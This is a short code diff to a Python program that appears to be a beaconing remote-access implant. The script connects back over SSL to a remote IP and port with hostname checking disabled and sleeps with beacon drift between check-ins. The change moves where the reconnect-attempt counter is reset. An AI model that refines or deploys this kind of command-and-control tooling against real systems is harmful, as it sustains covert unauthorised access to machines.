@@ -325,7 +325,7 @@ def callback_port(conn,data):
                 print(e)
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
-
+    global RECONNECT_ATTEMPTS
     data = ""
     context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
     context.check_hostname = False
@@ -347,6 +347,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         if VERBOSE:
             print_good("Connected!")
             print_good("SSL established. Peer: {}".format(conn.getpeercert()))
+        RECONNECT_ATTEMPTS = 5
         get_cwd()
     except ConnectionRefusedError:
         raise ConnectionRefusedError
@@ -501,7 +502,7 @@ def beacon_drift(value=30):
 
 def main():
     global BEACON_INTERVAL_SETTING
-    global RECONNECT_ATTEMPTS
+    
     global remote_port
     global remote_ip
     parser = argparse.ArgumentParser(description="")
@@ -556,7 +557,7 @@ def main():
                     if VERBOSE:
                         print_info("Sleeping for {}".format(drift))
                     sleep(drift)
-                    RECONNECT_ATTEMPTS = 5
+                    
             except KeyboardInterrupt:
                 if VERBOSE:
                     print_warn("Received Keyboard Interrupt")
